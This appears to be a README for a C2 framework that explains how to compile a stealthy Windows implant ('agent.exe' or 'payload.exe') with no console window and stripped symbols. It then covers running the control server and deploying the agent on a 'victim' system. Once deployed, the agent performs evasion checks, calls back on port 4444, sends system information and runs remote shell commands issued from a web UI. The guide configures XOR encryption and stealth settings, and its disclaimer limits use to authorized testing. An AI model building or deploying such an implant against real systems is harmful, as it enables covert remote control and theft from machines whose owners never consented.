# Agent Compilation Guide

## Quick Start

### Step 1: Install MinGW
```bash
python setup_mingw.py
```
Follow the prompts to install the MinGW compiler.

### Step 2: Compile Agent
```bash
# Default output: agent.exe
python compile_agent.py

# Custom output filename
python compile_agent.py -o payload.exe

# Verbose mode (show compilation details)
python compile_agent.py -o agent.exe -v
```

### Step 3: Run C2 Server
```bash
python c2_server.py
```

### Step 4: Deploy Agent
Run the compiled `agent.exe` on Windows target system.

---

## Detailed Instructions

### Windows Setup

#### Option A: MSYS2 (Recommended)
```bash
# 1. Install MSYS2
choco install msys2

# 2. Open MSYS2 terminal and run:
pacman -S mingw-w64-x86_64-toolchain

# 3. Add to PATH: C:\msys64\mingw64\bin

# 4. Verify:
x86_64-w64-mingw32-g++ --version
```

#### Option B: Direct MinGW
1. Download from: https://sourceforge.net/projects/mingw-w64/
2. Extract to `C:\mingw64`
3. Add `C:\mingw64\bin` to PATH
4. Restart terminal

---

## Compilation Details

### What the Script Does

```
compile_agent.py
├─ Checks MinGW installation
├─ Validates source file exists
├─ Builds compile command:
│  └─ x86_64-w64-mingw32-g++ src/main.cpp \
│     -o agent.exe \
│     -O2 (optimize)
│     -s (strip symbols)
│     -static (static link)
│     -mwindows (no console)
│     -lws2_32 -lwininet -ladvapi32 -lshell32 -liphlpapi
├─ Executes compilation
├─ Verifies output .exe
└─ Reports status & file size
```

### Compilation Flags Explained

| Flag | Purpose |
|------|---------|
| `-O2` | Optimize for speed |
| `-s` | Strip debug symbols (smaller file) |
| `-static` | Static link libraries (no DLL deps) |
| `-mwindows` | No console window (headless) |
| `-lws2_32` | Winsock 2 library (networking) |
| `-lwininet` | Internet library (HTTP) |
| `-ladvapi32` | Advanced Windows APIs (registry) |
| `-lshell32` | Shell library (cmd execution) |
| `-liphlpapi` | IP helper library (network info) |

---

## Output Information

After successful compilation:
```
[+] Compilation successful!
[+] Output: agent.exe
[+] Size: 234,567 bytes
```

The `.exe` file is:
- ✓ Fully standalone (no external DLLs)
- ✓ Optimized and compressed
- ✓ Ready to deploy
- ✓ Compatible with c2_server.py

---

## Deployment

### On Target Windows System:
```batch
C:\Users\victim> agent.exe
```

The agent will:
1. Perform evasion checks
2. Connect to C2 server (127.0.0.1:4444)
3. Send system information
4. Wait for commands from server
5. Execute commands and return output

### From C2 Server:
1. Open browser to `http://localhost:5000`
2. Wait for agent connection
3. Click agent in sidebar
4. Execute commands via web UI

---

## Troubleshooting

### Error: "Compiler not found"
```bash
# Check if MinGW is in PATH
where x86_64-w64-mingw32-g++

# If not found, reinstall and add to PATH
python setup_mingw.py
```

### Error: "Source file not found"
```bash
# Make sure you're in the framework directory
cd C:\Users\user\Downloads\AdvancedC2Framework
python compile_agent.py
```

### Compilation takes too long
- This is normal (first time: 10-30 seconds)
- Subsequent builds are faster (cached)

### Agent doesn't connect to server
- Verify C2_SERVER and C2_PORT match in main.cpp
- Check firewall allows port 4444
- Ensure c2_server.py is running

---

## Source Code Modification

To modify agent behavior, edit `src/main.cpp`:

```cpp
#define C2_SERVER "127.0.0.1"    // Change C2 IP
#define C2_PORT 4444              // Change port
#define SLEEP_TIME 5000           // Change check-in interval
#define XOR_KEY 0x42              // Change encryption key
```

Then recompile:
```bash
python compile_agent.py -o agent_new.exe
```

---

## Custom Configuration

### Build with Different Settings

Create `build_config.py`:
```python
COMPILER_FLAGS = {
    'optimization': '-O3',           # More optimization
    'console': '-mwindows',          # Keep as-is for stealth
    'libraries': ['-lws2_32', ...],  # Add/remove libraries
}
```

---

## Safety Notes

⚠️ **This tool is for:**
- ✓ Authorized security testing
- ✓ CTF competitions
- ✓ Educational purposes
- ✓ Controlled environments

❌ **Not for:**
- ✗ Unauthorized system access
- ✗ Malware distribution
- ✗ Criminal activity
- ✗ Unethical hacking

---

## Summary

```
1. python setup_mingw.py          # Install compiler
2. python compile_agent.py         # Build agent
3. python c2_server.py             # Start server
4. agent.exe                       # Deploy agent
5. http://localhost:5000           # Control via web UI
```

Done! 🔥
